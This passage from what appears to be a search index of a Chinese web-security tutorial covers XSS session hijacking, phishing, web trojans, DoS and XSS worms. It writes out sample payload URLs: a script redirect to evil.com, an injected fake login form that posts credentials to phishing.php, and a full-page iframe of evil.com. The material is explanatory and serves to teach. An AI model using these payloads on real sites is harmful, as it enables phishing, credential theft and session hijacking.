\u673a\u5236\u4e2d\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u901a\u8fc7\u6807\u8bc6\u7b26\u6765\u8bc6\u522b\u7528\u6237\u8eab\u4efd\u548c\u7ef4\u6301\u4f1a\u8bdd\uff0c\u4f46\u8fd9\u4e2a\u6807\u8bc6\u7b26\u4e5f\u6709\u88ab\u5176\u4ed6\u4eba\u5229\u7528\u7684\u53ef\u80fd\u3002\u4f1a\u8bdd\u52ab\u6301\u7684\u672c\u8d28\u662f\u5728\u653b\u51fb\u4e2d\u5e26\u4e0a\u4e86 Cookies \u5e76\u53d1\u9001\u5230\u4e86\u670d\u52a1\u7aef\u3002 \u5982\u67d0 CMS \u7684\u7559\u8a00\u7cfb\u7edf\u5b58\u5728\u4e00\u4e2a\u5b58\u50a8\u578b XSS \u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u628a XSS \u4ee3\u7801\u5199\u8fdb\u7559\u8a00\u4fe1\u606f\u4e2d\uff0c\u5f53\u7ba1\u7406\u5458\u767b\u5f55\u540e\u53f0\u5e76\u67e5\u770b\u662f\uff0c\u4fbf\u4f1a\u89e6\u53d1 XSS \u6f0f\u6d1e\uff0c\u7531\u4e8e XSS \u662f\u5728\u540e\u53f0\u89e6\u53d1\u7684\uff0c\u6240\u4ee5\u653b\u51fb\u7684\u5bf9\u8c61\u662f\u7ba1\u7406\u5458\uff0c\u901a\u8fc7\u6ce8\u5165 JavaScript \u4ee3\u7801\uff0c\u653b\u51fb\u8005\u4fbf\u53ef\u4ee5\u52ab\u6301\u7ba1\u7406\u5458\u4f1a\u8bdd\u6267\u884c\u67d0\u4e9b\u64cd\u4f5c\uff0c\u4ece\u800c\u8fbe\u5230\u63d0\u5347\u6743\u9650\u7684\u76ee\u7684\u3002 \u6bd4\u5982\uff0c\u653b\u51fb\u8005\u60f3\u5229\u7528 XSS \u6dfb\u52a0\u4e00\u4e2a\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u53ea\u9700\u8981\u901a\u8fc7\u4e4b\u524d\u7684\u4ee3\u7801\u5ba1\u8ba1\u6216\u5176\u4ed6\u65b9\u5f0f\uff0c\u622a\u53d6\u5230\u6dfb\u52a0\u7ba1\u7406\u5458\u8d26\u53f7\u65f6\u7684 HTTP \u8bf7\u6c42\u4fe1\u606f\uff0c\u7136\u540e\u4f7f\u7528 XMLHTTP \u5bf9\u8c61\u5728\u540e\u53f0\u53d1\u9001\u4e00\u4e2a HTTP \u8bf7\u6c42\u5373\u53ef\uff0c\u7531\u4e8e\u8bf7\u6c42\u5e26\u4e0a\u4e86\u88ab\u653b\u51fb\u8005\u7684 Cookies\uff0c\u5e76\u4e00\u540c\u53d1\u9001\u5230\u670d\u52a1\u7aef\uff0c\u5373\u53ef\u5b9e\u73b0\u6dfb\u52a0\u4e00\u4e2a\u7ba1\u7406\u5458\u8d26\u6237\u7684\u64cd\u4f5c\u3002","title":"\u4f1a\u8bdd\u52ab\u6301"},{"location":"web/xss/#_2","text":"\u91cd\u5b9a\u5411\u9493\u9c7c \u628a\u5f53\u524d\u9875\u9762\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u9493\u9c7c\u9875\u9762\u3002 http://www.bug.com/index.php?search=\"'><script>document.location.href=\"http://www.evil.com\"</script> HTML \u6ce8\u5165\u5f0f\u9493\u9c7c \u4f7f\u7528 XSS \u6f0f\u6d1e\u6ce8\u5165 HTML \u6216 JavaScript \u4ee3\u7801\u5230\u9875\u9762\u4e2d\u3002 http://www.bug.com/index.php?search=\"'<html><head><title>login</title></head><body><div style=\"text-align:center;\"><form Method=\"POST\" Action=\"phishing.php\" Name=\"form\"><br /><br />Login:<br/><input name=\"login\" /><br />Password:<br/><input name=\"Password\" type=\"password\" /><br/><br/><input name=\"Valid\" value=\"Ok\" type=\"submit\" /><br/></form></div></body></html> \u8be5\u6bb5\u4ee3\u7801\u4f1a\u5728\u6b63\u5e38\u9875\u9762\u4e2d\u5d4c\u5165\u4e00\u4e2a Form \u8868\u5355\u3002 iframe \u9493\u9c7c \u8fd9\u79cd\u65b9\u5f0f\u662f\u901a\u8fc7 <iframe> \u6807\u7b7e\u5d4c\u5165\u8fdc\u7a0b\u57df\u7684\u4e00\u4e2a\u9875\u9762\u5b9e\u65bd\u9493\u9c7c\u3002 http://www.bug.com/index.php?search='><iframe src=\"http://www.evil.com\" height=\"100%\" width=\"100%\"</iframe> Flash \u9493\u9c7c \u5c06\u6784\u9020\u597d\u7684 Flash \u6587\u4ef6\u4f20\u5165\u670d\u52a1\u5668\uff0c\u5728\u76ee\u6807\u7f51\u7ad9\u7528 <object> \u6216 <embed> \u6807\u7b7e\u5f15\u7528\u5373\u53ef\u3002 \u9ad8\u7ea7\u9493\u9c7c\u6280\u672f \u6ce8\u5165\u4ee3\u7801\u52ab\u6301 HTML \u8868\u5355\u3001\u4f7f\u7528 JavaScript \u7f16\u5199\u952e\u76d8\u8bb0\u5f55\u5668\u7b49\u3002","title":"\u9493\u9c7c"},{"location":"web/xss/#_3","text":"\u4e00\u822c\u90fd\u662f\u901a\u8fc7\u7be1\u6539\u7f51\u9875\u7684\u65b9\u5f0f\u6765\u5b9e\u73b0\u7684\uff0c\u5982\u5728 XSS \u4e2d\u4f7f\u7528 <iframe> \u6807\u7b7e\u3002","title":"\u7f51\u9875\u6302\u9a6c"},{"location":"web/xss/#dos-ddos","text":"\u6ce8\u5165\u6076\u610f JavaScript \u4ee3\u7801\uff0c\u53ef\u80fd\u4f1a\u5f15\u8d77\u4e00\u4e9b\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002","title":"DOS \u4e0e DDOS"},{"location":"web/xss/#xss_4","text":"\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684 XSS \u4ee3\u7801\uff0c\u53ef\u4ee5\u5b9e\u73b0\u975e\u6cd5\u8f6c\u8d26\u3001\u7be1\u6539\u4fe1\u606f\u3001\u5220\u9664\u6587\u7ae0\u3001\u81ea\u6211\u590d\u5236\u7b49\u8bf8\u591a\u529f\u80fd\u3002","title":"XSS \u8815\u866b"}]}